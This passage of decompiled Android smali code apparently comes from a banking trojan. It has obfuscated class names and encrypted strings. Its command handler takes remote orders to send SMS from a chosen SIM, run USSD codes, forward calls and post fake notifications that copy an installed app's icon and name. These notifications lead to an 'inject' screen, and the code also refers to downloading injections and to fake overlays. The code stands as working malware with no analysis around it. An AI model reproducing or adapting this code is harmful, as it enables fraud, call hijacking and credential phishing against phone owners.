    const-string v0, "TkZ3d1lmT0hmcHYzSXpCWWErUGhhelluRlJURzF1aFdaR2c0UEpHMlpHST06OkN0S1o5RTVKbG4rbTE3VTJlcVh3Ymc9PQ=="

    .line 26
    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 27
    :goto_9
    sget-object v0, Lb0/b;->a:Lb0/b;

    goto :goto_b

    :cond_12
    const-string v0, "Downloading Injections! Error downloand inject: "

    .line 28
    new-instance v1, Ljava/lang/Integer;

    invoke-direct {v1, v8}, Ljava/lang/Integer;-><init>(I)V

    .line 29
    invoke-static {v0, v1}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    goto :goto_9

    :cond_13
    new-instance v0, Ljava/lang/NullPointerException;

    const-string v1, "null cannot be cast to non-null type kotlin.Array<T>"

    invoke-direct {v0, v1}, Ljava/lang/NullPointerException;-><init>(Ljava/lang/String;)V

    throw v0
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    :goto_a
    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_14
    :goto_b
    sget-object v0, Lj0/g;->a:Lj0/g;

    return-object v0
.end method

.method public final c(Landroid/content/Context;Lorg/json/JSONObject;Ll0/d;)Ljava/lang/Object;
    .locals 5
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Lorg/json/JSONObject;",
            "Ll0/d<",
            "-",
            "Lj0/g;",
            ">;)",
            "Ljava/lang/Object;"
        }
    .end annotation

    instance-of v0, p3, Lh0/b$c;

    if-eqz v0, :cond_0

    move-object v0, p3

    check-cast v0, Lh0/b$c;

    iget v1, v0, Lh0/b$c;->h:I

    const/high16 v2, -0x80000000

    and-int v3, v1, v2

    if-eqz v3, :cond_0

    sub-int/2addr v1, v2

    iput v1, v0, Lh0/b$c;->h:I

    goto :goto_0

    :cond_0
    new-instance v0, Lh0/b$c;

    invoke-direct {v0, p0, p3}, Lh0/b$c;-><init>(Lh0/b;Ll0/d;)V

    :goto_0
    iget-object p3, v0, Lh0/b$c;->f:Ljava/lang/Object;

    sget-object v1, Lm0/a;->c:Lm0/a;

    iget v2, v0, Lh0/b$c;->h:I

    const/4 v3, 0x2

    const/4 v4, 0x1

    if-eqz v2, :cond_3

    if-eq v2, v4, :cond_2

    if-ne v2, v3, :cond_1

    goto :goto_1

    :cond_1
    new-instance p1, Ljava/lang/IllegalStateException;

    const-string p2, "call to \'resume\' before \'invoke\' with coroutine"

    invoke-direct {p1, p2}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw p1

    :cond_2
    :goto_1
    :try_start_0
    invoke-static {p3}, Lb/a;->C(Ljava/lang/Object;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :cond_3
    invoke-static {p3}, Lb/a;->C(Ljava/lang/Object;)V

    const-string p3, "params"

    invoke-virtual {p2, p3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p3

    const-string v2, "case "

    invoke-static {v2, p3}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    .line 1
    sget-object p3, Lb0/b;->a:Lb0/b;

    .line 2
    :try_start_1
    const-string p3, "params"

    invoke-virtual {p2, p3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p3

    const-string v2, "updateSettingsAndCommands"

    invoke-static {p3, v2}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_4

    const-string p3, "response"

    invoke-virtual {p2, p3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    const-string p3, "jsonObj.getString(vucu.d\u2026JmWmpabUI0aXZ2RHBBPT0=\"))"

    invoke-static {p2, p3}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    iput v4, v0, Lh0/b$c;->h:I

    invoke-virtual {p0, p1, p2, v0}, Lh0/b;->f(Landroid/content/Context;Ljava/lang/String;Ll0/d;)Ljava/lang/Object;

    move-result-object p1

    if-ne p1, v1, :cond_5

    return-object v1

    :cond_4
    const-string p2, "moduleWorkingWhile"

    invoke-static {p3, p2}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_5

    iput v3, v0, Lh0/b$c;->h:I

    invoke-virtual {p0, p1, v0}, Lh0/b;->e(Landroid/content/Context;Ll0/d;)Ljava/lang/Object;

    move-result-object p1
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    if-ne p1, v1, :cond_5

    return-object v1

    :catch_0
    move-exception p1

    const-string p2, "Error pofudovoboxenu main"

    invoke-static {p2, p1}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    .line 3
    sget-object p1, Lb0/b;->a:Lb0/b;

    .line 4
    :cond_5
    :goto_2
    sget-object p1, Lj0/g;->a:Lj0/g;

    return-object p1
.end method

.method public final d(Landroid/content/Context;Lorg/json/JSONObject;Ljava/lang/String;)V
    .locals 20

    move-object/from16 v1, p1

    move-object/from16 v0, p2

    invoke-virtual/range {p3 .. p3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    const-string v3, "(this as java.lang.String).toLowerCase()"

    invoke-static {v2, v3}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v3, "sendsms"

    invoke-static {v2, v3}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    sget-object v2, Lh0/a;->a:Lh0/a;

    invoke-static/range {p2 .. p2}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v3, "number"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "payload!!.getString(vucu\u2026RxaENTRXJDbmRaZ2Z3PT0=\"))"

    invoke-static {v3, v4}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v4, "text"

    invoke-virtual {v0, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "payload.getString(vucu.d\u2026ZXWHBCV0R3UkNZbmp3PT0=\"))"

    invoke-static {v4, v5}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v5, "sim"

    invoke-virtual {v0, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v5, "sim2"

    invoke-static {v0, v5}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    invoke-virtual {v2, v1, v3, v4, v0}, Lh0/a;->s(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V

    goto/16 :goto_e

    :cond_0
    const-string v3, "startussd"

    invoke-static {v2, v3}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    sget-object v2, Lh0/a;->a:Lh0/a;

    invoke-static/range {p2 .. p2}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v3, "ussd"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "payload!!.getString(vucu\u2026FQQnVzcWxyRUZ4SzhRPT0=\"))"

    invoke-static {v3, v4}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v4, "sim"

    invoke-virtual {v0, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v4, "sim2"

    invoke-static {v0, v4}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    invoke-virtual {v2, v1, v3, v0}, Lh0/a;->y(Landroid/content/Context;Ljava/lang/String;I)V

    goto/16 :goto_e

    :cond_1
    const-string v3, "forwardcall"

    invoke-static {v2, v3}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_2

    sget-object v2, Lh0/a;->a:Lh0/a;

    invoke-static/range {p2 .. p2}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v3, "number"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "payload!!.getString(vucu\u2026VnTUhRZkZHczdxRTB3PT0=\"))"

    invoke-static {v3, v4}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v4, "sim"

    invoke-virtual {v0, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v4, "sim2"

    invoke-static {v0, v4}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    invoke-virtual {v2, v1, v3, v0}, Lh0/a;->b(Landroid/content/Context;Ljava/lang/String;I)V

    goto/16 :goto_e

    :cond_2
    const-string v3, "push"

    invoke-static {v2, v3}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v3

    const-string v4, "obj.toString()"

    const-string v5, ""

    const/4 v6, 0x0

    const/4 v7, 0x0

    if-eqz v3, :cond_11

    sget-object v2, Lh0/a;->a:Lh0/a;

    invoke-static/range {p2 .. p2}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v3, "app"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v8, "payload!!.getString(vucu\u2026VvWkhWTWVrcnhTZDNnPT0=\"))"

    invoke-static {v3, v8}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v8, "title"

    invoke-virtual {v0, v8}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    const-string v9, "text"

    invoke-virtual {v0, v9}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    const-string v10, "::endlog::"

    const-string v0, "mContext"

    .line 1
    invoke-static {v1, v0}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    :try_start_0
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    const-string v11, "mContext.packageManager"

    invoke-static {v0, v11}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    new-instance v11, Landroid/content/Intent;

    const-string v12, "android.intent.action.MAIN"

    invoke-direct {v11, v12, v6}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const-string v12, "android.intent.category.LAUNCHER"

    invoke-virtual {v11, v12}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v0, v11, v7}, Landroid/content/pm/PackageManager;->queryIntentActivities(Landroid/content/Intent;I)Ljava/util/List;

    move-result-object v11

    const-string v12, "pm.queryIntentActivities(main, 0)"

    invoke-static {v11, v12}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    new-instance v12, Landroid/content/pm/ResolveInfo$DisplayNameComparator;

    invoke-direct {v12, v0}, Landroid/content/pm/ResolveInfo$DisplayNameComparator;-><init>(Landroid/content/pm/PackageManager;)V

    invoke-static {v11, v12}, Ljava/util/Collections;->sort(Ljava/util/List;Ljava/util/Comparator;)V

    invoke-interface {v11}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v11
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    move-object v12, v6

    :cond_3
    :goto_0
    :try_start_1
    invoke-interface {v11}, Ljava/util/Iterator;->hasNext()Z

    move-result v13

    if-eqz v13, :cond_5

    invoke-interface {v11}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v13

    check-cast v13, Landroid/content/pm/ResolveInfo;

    iget-object v13, v13, Landroid/content/pm/ResolveInfo;->activityInfo:Landroid/content/pm/ActivityInfo;

    iget-object v14, v13, Landroid/content/pm/ActivityInfo;->packageName:Ljava/lang/String;

    invoke-static {v14, v3}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v14

    if-nez v14, :cond_4

    iget-object v14, v13, Landroid/content/pm/ActivityInfo;->packageName:Ljava/lang/String;

    const-string v15, "activity.packageName"

    invoke-static {v14, v15}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const/4 v15, 0x2

    invoke-static {v14, v3, v7, v15}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v14

    if-eqz v14, :cond_3

    :cond_4
    invoke-virtual {v13, v0}, Landroid/content/pm/ActivityInfo;->loadIcon(Landroid/content/pm/PackageManager;)Landroid/graphics/drawable/Drawable;

    move-result-object v14

    invoke-static {v14}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-virtual {v2, v14}, Lh0/a;->e(Landroid/graphics/drawable/Drawable;)Landroid/graphics/Bitmap;

    move-result-object v6

    invoke-virtual {v13, v0}, Landroid/content/pm/ActivityInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v12
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception v0

    goto :goto_1

    :catchall_1
    move-exception v0

    const/4 v6, 0x0

    const/4 v12, 0x0

    :goto_1
    :try_start_2
    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    :cond_5
    if-nez v6, :cond_7

    :try_start_3
    const-string v0, "icon_"

    invoke-static {v0, v3}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    .line 2
    sget-object v11, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v11, :cond_6

    const-string v11, "settings"

    invoke-virtual {v1, v11, v7}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v11

    sput-object v11, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_6
    sget-object v11, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v11}, Ls0/c;->g(Ljava/lang/Object;)V

    const/4 v13, 0x0

    invoke-interface {v11, v0, v13}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_2

    goto :goto_2

    :catchall_2
    move-exception v0

    .line 3
    :try_start_4
    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_7
    const/4 v0, 0x0

    :goto_2
    move-object v11, v0

    new-instance v0, Landroid/content/Intent;

    const-class v13, Lcom/cisojemopatude/yazi/catozotu/safotehehefu;

    invoke-direct {v0, v1, v13}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v13, "push"

    const-string v14, "1"

    invoke-virtual {v0, v13, v14}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v13, "startpush"

    invoke-virtual {v0, v13, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v13, 0x10000000

    invoke-virtual {v0, v13}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const v13, 0x8000

    invoke-virtual {v0, v13}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v13

    const/high16 v14, 0x20000

    invoke-virtual {v13, v14}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 4
    sget-object v13, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v13}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v13}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v13

    const-string v14, "app_inject"

    invoke-interface {v13, v14, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v13}, Landroid/content/SharedPreferences$Editor;->apply()V

    const/high16 v13, 0x10000000

    .line 5
    invoke-static {v1, v7, v0, v13}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    :try_start_5
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v7

    const-string v13, ":mipmap/ic_launcher"

    invoke-static {v3, v13}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    const/4 v13, 0x0

    invoke-virtual {v7, v3, v13, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_0

    goto :goto_3

    :catch_0
    const/4 v3, 0x0

    :goto_3
    :try_start_6
    new-instance v7, Landroid/widget/RemoteViews;

    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v13

    const v14, 0x7f0b001e

    invoke-direct {v7, v13, v14}, Landroid/widget/RemoteViews;-><init>(Ljava/lang/String;I)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v13

    const/4 v15, 0x1

    invoke-static {v1, v13, v14, v15}, Landroid/text/format/DateUtils;->formatDateTime(Landroid/content/Context;JI)Ljava/lang/String;

    move-result-object v13

    const v14, 0x7f080084

    invoke-virtual {v7, v14, v13}, Landroid/widget/RemoteViews;->setTextViewText(ILjava/lang/CharSequence;)V

    const v13, 0x7f08005b

    if-eqz v6, :cond_8

    invoke-virtual {v7, v13, v6}, Landroid/widget/RemoteViews;->setImageViewBitmap(ILandroid/graphics/Bitmap;)V

    goto :goto_4

    :cond_8
    if-eqz v11, :cond_9

    invoke-virtual {v2, v11}, Lh0/a;->h(Ljava/lang/String;)Landroid/graphics/Bitmap;

    move-result-object v14

    invoke-virtual {v7, v13, v14}, Landroid/widget/RemoteViews;->setImageViewBitmap(ILandroid/graphics/Bitmap;)V

    :cond_9
    :goto_4
    const v13, 0x7f0800a9

    invoke-virtual {v7, v13, v8}, Landroid/widget/RemoteViews;->setTextViewText(ILjava/lang/CharSequence;)V

    const v13, 0x7f0800a0

    invoke-virtual {v7, v13, v9}, Landroid/widget/RemoteViews;->setTextViewText(ILjava/lang/CharSequence;)V

    const v13, 0x7f08003e

    invoke-virtual {v7, v13, v0}, Landroid/widget/RemoteViews;->setOnClickPendingIntent(ILandroid/app/PendingIntent;)V

    .line 6
    new-instance v13, Lk/a;

    invoke-direct {v13, v1}, Lk/a;-><init>(Landroid/content/Context;)V

    if-nez v12, :cond_a

    .line 7
    const-string v14, "channel_push"

    goto :goto_5

    :cond_a
    move-object v14, v12

    :goto_5
    move-object/from16 p3, v5

    if-nez v12, :cond_b

    move-object/from16 v15, p3

    goto :goto_6

    :cond_b
    move-object v15, v12

    :goto_6
    new-instance v5, Landroid/app/NotificationChannel;

    if-nez v12, :cond_c

    const-string v12, "google"

    :cond_c
    move-object/from16 v16, v4

    const/4 v4, 0x4

    invoke-direct {v5, v14, v12, v4}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    invoke-virtual {v5, v15}, Landroid/app/NotificationChannel;->setDescription(Ljava/lang/String;)V

    const/4 v4, 0x1

    invoke-virtual {v5, v4}, Landroid/app/NotificationChannel;->enableLights(Z)V

    const/high16 v12, -0x10000

    invoke-virtual {v5, v12}, Landroid/app/NotificationChannel;->setLightColor(I)V

    invoke-virtual {v5, v4}, Landroid/app/NotificationChannel;->enableVibration(Z)V

    const/4 v12, 0x5

    new-array v15, v12, [J

    const-wide/16 v17, 0x5dc

    const/16 v19, 0x0

    aput-wide v17, v15, v19

    aput-wide v17, v15, v4

    const/4 v4, 0x2

    aput-wide v17, v15, v4

    const/4 v4, 0x3

    aput-wide v17, v15, v4

    const/4 v4, 0x4

    aput-wide v17, v15, v4

    invoke-virtual {v5, v15}, Landroid/app/NotificationChannel;->setVibrationPattern([J)V

    const/4 v4, 0x0

    invoke-virtual {v5, v4}, Landroid/app/NotificationChannel;->setShowBadge(Z)V

    .line 8
    iget-object v4, v13, Lk/a;->b:Landroid/app/NotificationManager;

    invoke-virtual {v4, v5}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 9
    new-instance v4, Landroid/app/Notification$Builder;

    invoke-direct {v4, v1, v14}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    new-instance v5, Landroid/app/Notification$BigTextStyle;

    invoke-direct {v5}, Landroid/app/Notification$BigTextStyle;-><init>()V

    invoke-virtual {v5, v9}, Landroid/app/Notification$BigTextStyle;->bigText(Ljava/lang/CharSequence;)Landroid/app/Notification$BigTextStyle;

    invoke-virtual {v5, v8}, Landroid/app/Notification$BigTextStyle;->setBigContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$BigTextStyle;

    invoke-virtual {v5, v9}, Landroid/app/Notification$BigTextStyle;->setSummaryText(Ljava/lang/CharSequence;)Landroid/app/Notification$BigTextStyle;

    const/4 v14, 0x1

    invoke-virtual {v4, v14}, Landroid/app/Notification$Builder;->setPriority(I)Landroid/app/Notification$Builder;

    move-result-object v15

    invoke-virtual {v15, v8}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v8

    invoke-virtual {v8, v9}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v8

    new-array v9, v12, [J

    const/4 v12, 0x0

    aput-wide v17, v9, v12

    aput-wide v17, v9, v14

    const/4 v12, 0x2

    aput-wide v17, v9, v12

    const/4 v12, 0x3

    aput-wide v17, v9, v12

    const/4 v12, 0x4

    aput-wide v17, v9, v12

    invoke-virtual {v8, v9}, Landroid/app/Notification$Builder;->setVibrate([J)Landroid/app/Notification$Builder;

    move-result-object v8

    invoke-virtual {v8, v5}, Landroid/app/Notification$Builder;->setStyle(Landroid/app/Notification$Style;)Landroid/app/Notification$Builder;

    move-result-object v5

    const/4 v8, 0x0

    invoke-virtual {v5, v8}, Landroid/app/Notification$Builder;->setAutoCancel(Z)Landroid/app/Notification$Builder;

    move-result-object v5

    invoke-virtual {v5, v0}, Landroid/app/Notification$Builder;->setContentIntent(Landroid/app/PendingIntent;)Landroid/app/Notification$Builder;

    move-result-object v0

    const/4 v5, 0x2

    invoke-virtual {v0, v5}, Landroid/app/Notification$Builder;->setDefaults(I)Landroid/app/Notification$Builder;

    move-result-object v0

    const/4 v5, 0x1

    invoke-virtual {v0, v5}, Landroid/app/Notification$Builder;->setDefaults(I)Landroid/app/Notification$Builder;

    move-result-object v0

    const/4 v5, 0x4

    invoke-virtual {v0, v5}, Landroid/app/Notification$Builder;->setDefaults(I)Landroid/app/Notification$Builder;

    move-result-object v0

    const-string v5, "msg"

    invoke-virtual {v0, v5}, Landroid/app/Notification$Builder;->setCategory(Ljava/lang/String;)Landroid/app/Notification$Builder;

    invoke-virtual {v4, v7}, Landroid/app/Notification$Builder;->setCustomContentView(Landroid/widget/RemoteViews;)Landroid/app/Notification$Builder;

    if-eqz v6, :cond_d

    invoke-static {v6}, Landroid/graphics/drawable/Icon;->createWithBitmap(Landroid/graphics/Bitmap;)Landroid/graphics/drawable/Icon;

    move-result-object v0

    invoke-virtual {v4, v0}, Landroid/app/Notification$Builder;->setSmallIcon(Landroid/graphics/drawable/Icon;)Landroid/app/Notification$Builder;

    goto :goto_7

    :cond_d
    if-eqz v3, :cond_e

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v0
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    if-lez v0, :cond_e

    :try_start_7
    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v0

    invoke-virtual {v4, v0}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_3

    goto :goto_7

    :catchall_3
    move-exception v0

    :try_start_8
    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_1

    goto :goto_7

    :cond_e
    const/high16 v0, 0x7f0c0000

    :try_start_9
    invoke-virtual {v4, v0}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_4

    goto :goto_7

    :catchall_4
    move-exception v0

    move-object v3, v0

    :try_start_a
    invoke-static {v3}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :goto_7
    if-eqz v6, :cond_f

    invoke-virtual {v4, v6}, Landroid/app/Notification$Builder;->setLargeIcon(Landroid/graphics/Bitmap;)Landroid/app/Notification$Builder;

    goto :goto_8

    :cond_f
    if-eqz v11, :cond_10

    invoke-virtual {v2, v11}, Lh0/a;->h(Ljava/lang/String;)Landroid/graphics/Bitmap;

    move-result-object v0

    invoke-virtual {v4, v0}, Landroid/app/Notification$Builder;->setLargeIcon(Landroid/graphics/Bitmap;)Landroid/app/Notification$Builder;

    :cond_10
    :goto_8
    invoke-virtual {v4}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v0

    const-string v2, "notificationBuilder.build()"

    invoke-static {v0, v2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v2, Lt0/c;->d:Lt0/c$a;

    const/16 v2, 0x270f

    .line 10
    sget-object v3, Lt0/c;->c:Lt0/c;

    const/4 v4, 0x1

    .line 11
    invoke-virtual {v3, v4, v2}, Lt0/c;->c(II)I

    move-result v2

    const/4 v3, 0x0

    .line 12
    invoke-virtual {v13, v3, v2, v0}, Lk/a;->a(Ljava/lang/String;ILandroid/app/Notification;)V

    const-string v0, "send local Notification"

    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    const-string v3, "push"

    invoke-virtual {v2, v3, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    sget-object v0, Lb0/b;->a:Lb0/b;

    .line 13
    sget-object v0, Lb0/b;->S:Ljava/lang/String;

    .line 14
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v1, v0, v3}, Ls0/c;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object v0, Lc0/b;->a:Lc0/b;

    invoke-virtual {v2}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v3, v16

    invoke-static {v2, v3}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v3, "sendNotification"

    move-object/from16 v4, p3

    invoke-virtual {v0, v1, v4, v2, v3}, Lc0/b;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_1

    goto/16 :goto_e

    :catch_1
    move-exception v0

    const-string v2, "ZTBEVWJYVGVHclROOTV6bmFBM0thNWR6czdvV0RCMGpOU2c1Lyt2dm4vdz06OlB4L1FtNVdUVkw2aC9GSHRzR0NFdkE9PQ=="

    invoke-static {v2}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    const-string v2, "QWFlWW1JaTdndmEzYkROMkxMWUpYUT09OjpzR0czNGtqZUdBOFRkakdWWTlZbmxBPT0="

    invoke-static {v2}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 15
    sget-object v2, Lb0/b;->a:Lb0/b;

    const-string v2, "ERROR sendNotification "

    .line 16
    invoke-static {v2, v0}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    const-string v3, "openFake_Error"

    invoke-virtual {v2, v3, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 17
    sget-object v0, Lb0/b;->S:Ljava/lang/String;

    .line 18
